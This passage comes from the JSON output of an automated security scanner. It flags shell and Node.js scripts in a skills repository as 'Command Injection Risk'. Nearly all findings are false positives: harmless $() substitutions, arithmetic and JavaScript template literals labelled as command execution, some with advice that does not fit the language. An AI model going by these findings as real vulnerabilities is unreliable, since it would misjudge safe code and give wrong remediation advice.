        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 185,
        "issue": "Command substitution in shell",
        "evidence": "local temp_value=$(docker exec etcd-node1 etcdctl get temp-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 206,
        "issue": "Command substitution in shell",
        "evidence": "local counter=$(docker exec etcd-node1 etcdctl get counter --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local status=$(docker exec \"etcd-node$i\" etcdctl endpoint status --cluster -w json 2>/dev/null || echo \"[]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "local is_leader=$(echo \"$status\" | jq -r \".[0].Status.leader == .[0].Status.header.member_id\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 232,
        "issue": "Command substitution in shell",
        "evidence": "\"endpoint\": \"http://localhost:$((2378 + i))\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "$(IFS=,; echo \"${nodes_status[*]}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 266,
        "issue": "Command substitution in shell",
        "evidence": "log_info \"  Node $i: http://localhost:$((2378 + i))\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 125,
        "issue": "Command substitution in shell",
        "evidence": "count=$((count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 126,
        "issue": "Command substitution in shell",
        "evidence": "local basename=$(basename \"$workflow\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 129,
        "issue": "Command substitution in shell",
        "evidence": "local name=$(grep -E \"^name:\" \"$workflow\" | head -1 | sed 's/name: *//' | tr -d '\"' | tr -d \"'\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 139,
        "issue": "Command substitution in shell",
        "evidence": "local triggers=$(awk '/^on:/{flag=1;next}/^[a-zA-Z]/{flag=0}flag' \"$workflow\" | grep -v \"^$\" | sed 's/^  //' | tr '\\n' ', ' | sed 's/, $//')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 145,
        "issue": "Command substitution in shell",
        "evidence": "local job_count=$(grep -E \"^  [a-z][a-z_-]+:\" \"$workflow\" | wc -l | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "echo -e \"${BLUE}Testing workflow: $(basename \"$workflow_path\")${NC}\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 240,
        "issue": "Command substitution in shell",
        "evidence": "local output_file=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$((end_time - start_time))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local job_count=$(grep -c \"Job succeeded\" \"$output_file\" || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 259,
        "issue": "Command substitution in shell",
        "evidence": "local failed_jobs=$(grep -c \"Job failed\" \"$output_file\" || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "local workflow_name=$(basename \"$workflow_path\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "if ! workflow_path=$(validate_workflow \"$WORKFLOW\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 36,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 53,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --concurrency 100 --threads 4",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 56,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --duration 30 --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 59,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --test-workers",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 62,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --test-cache",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 140,
        "issue": "Command substitution in shell",
        "evidence": "wrk_output=$(wrk -t\"$threads\" -c\"$connections\" -d\"${duration}s\" --latency \"$url\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "requests_per_sec=$(echo \"$wrk_output\" | grep \"Requests/sec:\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 155,
        "issue": "Command substitution in shell",
        "evidence": "total_requests=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $1}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 156,
        "issue": "Command substitution in shell",
        "evidence": "total_data=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $5}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "avg_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 158,
        "issue": "Command substitution in shell",
        "evidence": "max_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $4}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 159,
        "issue": "Command substitution in shell",
        "evidence": "stdev_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $3}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "latency_50=$(echo \"$wrk_output\" | grep \"50.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "latency_75=$(echo \"$wrk_output\" | grep \"75.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "latency_90=$(echo \"$wrk_output\" | grep \"90.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "latency_99=$(echo \"$wrk_output\" | grep \"99.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 256,
        "issue": "Command substitution in shell",
        "evidence": "miss_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "hit_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 274,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$hit_rps > $miss_rps\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "improvement=$(echo \"scale=2; (($hit_rps - $miss_rps) / $miss_rps) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$rps < 100\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$rps < 1000\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 30,
        "issue": "eval() usage",
        "evidence": "redisClient.eval(script, numKeys, ...args, (err, result) => {",
        "recommendation": "Never use eval() with user input"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 92,
        "issue": "Backtick command execution",
        "evidence": "`rate_limit:${key}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 133,
        "issue": "Backtick command execution",
        "evidence": "return `api_key:${apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 138,
        "issue": "Backtick command execution",
        "evidence": "return `user:${req.user.id}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 143,
        "issue": "Backtick command execution",
        "evidence": "return `ip:${ip}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 179,
        "issue": "Backtick command execution",
        "evidence": "message: `Too many requests. Please retry after ${retryAfter} seconds.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "keyGenerator: (req) => `user:${req.user?.id || 'anonymous'}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 31,
        "issue": "Backtick command execution",
        "evidence": "req.id = `req-${Date.now()}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 187,
        "issue": "Backtick command execution",
        "evidence": "const baseUrl = `${req.protocol}://${req.get('host')}${req.path}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 188,
        "issue": "Backtick command execution",
        "evidence": "let queryParams = `limit=${limit}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 189,
        "issue": "Backtick command execution",
        "evidence": "if (status) queryParams += `&status=${status}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 190,
        "issue": "Backtick command execution",
        "evidence": "if (role) queryParams += `&role=${role}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 191,
        "issue": "Backtick command execution",
        "evidence": "if (sort) queryParams += `&sort=${sort}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 194,
        "issue": "Backtick command execution",
        "evidence": "self: `${baseUrl}?${queryParams}&offset=${offset}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 195,
        "issue": "Backtick command execution",
        "evidence": "first: `${baseUrl}?${queryParams}&offset=0`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 196,
        "issue": "Backtick command execution",
        "evidence": "last: `${baseUrl}?${queryParams}&offset=${Math.max(0, total - limit)}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 200,
        "issue": "Backtick command execution",
        "evidence": "links.prev = `${baseUrl}?${queryParams}&offset=${Math.max(0, offset - limit)}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 204,
        "issue": "Backtick command execution",
        "evidence": "links.next = `${baseUrl}?${queryParams}&offset=${offset + limit}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 236,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 242,
        "issue": "Backtick command execution",
        "evidence": "const etag = `\"${new Date(user.updated_at).getTime()}\"`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 267,
        "issue": "Backtick command execution",
        "evidence": "message: `User with email ${email} already exists`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 286,
        "issue": "Backtick command execution",
        "evidence": ".set('Location', `/api/users/${newUser.id}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 305,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 360,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 381,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Server running on port ${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 382,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 383,
        "issue": "Backtick command execution",
        "evidence": "console.log(`API: http://localhost:${PORT}/api/users`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 119,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Warming up with ${this.options.warmup} requests...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 126,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Running ${this.options.iterations} iterations with concurrency ${this.options.concurrent}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 193,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`HTTP ${res.statusCode}: ${data}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 200,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`GraphQL errors: ${JSON.stringify(json.errors)}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 206,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`JSON parse error: ${error.message}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 241,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total: ${stats.totalRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 242,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Successful: ${stats.successfulRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 243,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Failed: ${stats.failedRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 244,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Success Rate: ${stats.successRate.toFixed(2)}%`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Min: ${stats.timings.min.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 250,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Max: ${stats.timings.max.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 251,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Avg: ${stats.timings.avg.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 252,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P50: ${stats.timings.p50.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P90: ${stats.timings.p90.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 254,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P95: ${stats.timings.p95.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 255,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P99: ${stats.timings.p99.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 260,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Requests/sec: ${stats.throughput.requestsPerSecond.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 265,
        "issue": "Backtick command execution",
